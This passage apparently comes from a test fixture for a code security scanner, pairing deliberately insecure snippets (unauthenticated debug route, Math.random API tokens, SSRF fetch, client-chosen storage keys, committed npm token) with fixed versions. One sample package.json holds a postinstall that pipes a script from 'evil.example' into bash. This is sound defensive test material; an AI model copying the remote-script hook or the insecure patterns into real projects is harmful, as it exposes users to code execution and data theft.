    ignores: f('app/api/unsubscribe/route.ts', "export async function GET(req: Request) {\n  const url = new URL(req.url);\n  url.searchParams.delete('utm_source');\n  const sub = await prisma.subscription.findUnique({ where: { token: url.searchParams.get('token') ?? '' } });\n  return Response.json({ confirm: Boolean(sub) });\n}\nexport async function POST(req: Request) {\n  const { token } = await req.json();\n  await prisma.subscription.delete({ where: { token } });\n  return new Response('ok');\n}\n")
  },
  {
    ruleIds: [7218],
    name: 'Debug endpoint without authentication',
    detects: f('app/api/debug/route.ts', 'export async function GET() {\n  return Response.json({ env: process.env.NODE_ENV, memory: process.memoryUsage() });\n}\n'),
    ignores: f('app/api/debug/route.ts', "export async function GET() {\n  const session = await getServerSession();\n  if (!session) return new Response(null, { status: 401 });\n  return Response.json({ memory: process.memoryUsage() });\n}\n")
  },
  {
    ruleIds: [7242],
    name: 'WebSocket server without origin check',
    detects: f('server/ws.ts', "import { WebSocketServer } from 'ws';\nexport const wss = new WebSocketServer({ port: 8080 });\n"),
    ignores: [
      { path: 'server/ws.ts', content: "import { WebSocketServer } from 'ws';\nexport const wss = new WebSocketServer({ port: 8080, verifyClient: ({ origin }) => ALLOWED.has(origin) });\n" },
      { path: 'server/ws2.ts', content: "import { WebSocketServer } from 'ws';\nexport const wss = new WebSocketServer({ port: 8080 });\nwss.on('connection', (ws, req) => { if (!ALLOWED.has(req.headers.origin ?? '')) ws.close(); });\n" }
    ]
  },
  {
    ruleIds: [7245],
    name: 'API token generated with Math.random',
    detects: f('lib/api-keys.ts', 'export function issue() {\n  const token = Math.random().toString(36).slice(2);\n  return token;\n}\n'),
    ignores: f('lib/api-keys.ts', "import { randomBytes } from 'crypto';\nexport function issue() {\n  const token = randomBytes(32).toString('hex');\n  return token;\n}\n")
  },
  {
    ruleIds: [7302],
    name: 'postinstall pipes a remote script into a shell',
    detects: f('package.json', '{\n  "name": "app",\n  "scripts": {\n    "postinstall": "curl -s https://evil.example/x.sh | bash"\n  }\n}\n'),
    ignores: f('package.json', '{\n  "name": "app",\n  "scripts": {\n    "postinstall": "prisma generate"\n  }\n}\n')
  },
  {
    ruleIds: [7304],
    name: 'Compromised event-stream / flatmap-stream release',
    detects: f('package.json', '{\n  "dependencies": {\n    "event-stream": "3.3.6"\n  }\n}\n'),
    ignores: f('package.json', '{\n  "dependencies": {\n    "event-stream": "^4.0.1"\n  }\n}\n')
  },
  {
    ruleIds: [7307],
    name: 'npm auth token committed in .npmrc',
    detects: f('.npmrc', `//registry.npmjs.org/:_authToken=${['npm', 'Zx81QwErTy7UiOpAsDfGhJkLzXcVbNm0123'].join('_')}\n`),
    ignores: f('.npmrc', '//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n')
  },
  {
    ruleIds: [7317],
    name: 'Package registry over plain HTTP',
    detects: f('.npmrc', 'registry=http://registry.npmjs.org/\n'),
    ignores: f('.npmrc', 'registry=https://registry.npmjs.org/\n')
  },
  {
    ruleIds: [8602],
    name: 'Service role key passed to a client component',
    detects: f('components/AdminPanel.tsx', "'use client';\nexport function AdminPanel({ serviceRoleKey }: { serviceRoleKey: string }) {\n  return <div data-k={serviceRoleKey} />;\n}\n"),
    ignores: f('components/AdminPanel.tsx', "'use client';\nexport function AdminPanel({ users }: { users: string[] }) {\n  return <ul>{users.map((u) => <li key={u}>{u}</li>)}</ul>;\n}\n")
  },
  {
    ruleIds: [9102],
    name: 'Tenant id kept in module-level state',
    detects: f('lib/tenant.ts', 'let currentTenant: string | null = null;\nexport function setTenant(id: string) { currentTenant = id; }\nexport const getTenant = () => currentTenant;\n'),
    ignores: f('lib/tenant.ts', "import { AsyncLocalStorage } from 'node:async_hooks';\nconst store = new AsyncLocalStorage<string>();\nexport const withTenant = <T>(id: string, fn: () => T) => store.run(id, fn);\nexport const getTenant = () => store.getStore();\n")
  },
  {
    ruleIds: [9104],
    name: 'Storage object key chosen by the client',
    detects: f('app/api/upload/route.ts', "export async function POST(req: Request) {\n  const body = await req.json();\n  await s3.send(new PutObjectCommand({ Bucket: 'uploads', Key: body.filename, Body: body.data }));\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/upload/route.ts', "export async function POST(req: Request) {\n  const session = await auth();\n  const body = await req.json();\n  await s3.send(new PutObjectCommand({ Bucket: 'uploads', Key: `${session.user.id}/${randomUUID()}`, Body: body.data }));\n  return new Response('ok');\n}\n")
  },
  {
    ruleIds: [1],
    name: 'Live Stripe key in docs vs a `sk_live_...` placeholder',
    detects: f('content/docs/deploy.mdx', `Set STRIPE_SECRET_KEY=${FAKE_STRIPE_LIVE} in Vercel.\n`),
    ignores: f('content/docs/deployment.mdx', '| `STRIPE_SECRET_KEY` | Live key (`sk_live_...`) |\n')
  },
  {
    ruleIds: [12101],
    name: 'Secret value logged vs a log message that names a secret',
    detects: f('lib/db/setup.ts', "export function setup(secretKey: string) {\n  console.log('Using key', secretKey);\n}\n"),
    ignores: f('lib/db/setup.ts', "export function setup(secretKey: string) {\n  console.log('Step 3: Getting Stripe Secret Key');\n  return secretKey.length;\n}\n")
  },
  {
    ruleIds: [8207],
    name: 'Sentry sends default PII without a beforeSend scrubber',
    detects: f('src/instrumentation-client.ts', "import * as Sentry from '@sentry/nextjs';\nSentry.init({\n  dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,\n  sendDefaultPii: true,\n});\n"),
    ignores: f('src/instrumentation-client.ts', "import * as Sentry from '@sentry/nextjs';\nSentry.init({\n  dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,\n  sendDefaultPii: true,\n  beforeSend: (event) => scrubPii(event),\n});\n")
  },
  {
    ruleIds: [27101],
    name: 'Server fetches a URL taken from the request body (SSRF)',
    detects: f('app/api/preview/route.ts', "export async function POST(req: Request) {\n  const session = await auth();\n  const { url } = await req.json();\n  const res = await fetch(url);\n  return new Response(await res.text());\n}\n"),
    ignores: [
      { path: 'app/api/preview/route.ts', content: "export async function POST(req: Request) {\n  const session = await auth();\n  const { url } = await req.json();\n  const check = await validateSafeTargetUrl(url);\n  if (!check.safe) return new Response(null, { status: 400 });\n  const res = await fetch(url);\n  return new Response(await res.text());\n}\n" },
      // URL built from configuration, not from the request
      { path: 'lib/notify.ts', content: "export async function notify(event: string) {\n  const url = `${process.env.SLACK_WEBHOOK_URL}`;\n  await fetch(url, { method: 'POST', body: JSON.stringify({ text: event }) });\n}\n" }
    ]
  },
  {
    ruleIds: [100, 101],
    name: 'Live target down and without CSP',
    detects: f('live-deployment/security-headers.json', JSON.stringify({ targetUrl: 'https://app.example', statusCode: 503, isHealthy: false, missingSecurityHeaders: ['Content-Security-Policy'], headers: {} })),
    ignores: f('live-deployment/security-headers.json', JSON.stringify({ targetUrl: 'https://app.example', statusCode: 200, isHealthy: true, missingSecurityHeaders: [], headers: { 'content-security-policy': "default-src 'self'" } }))
  }
];

export const KNOWN_GAPS: KnownGap[] = [];
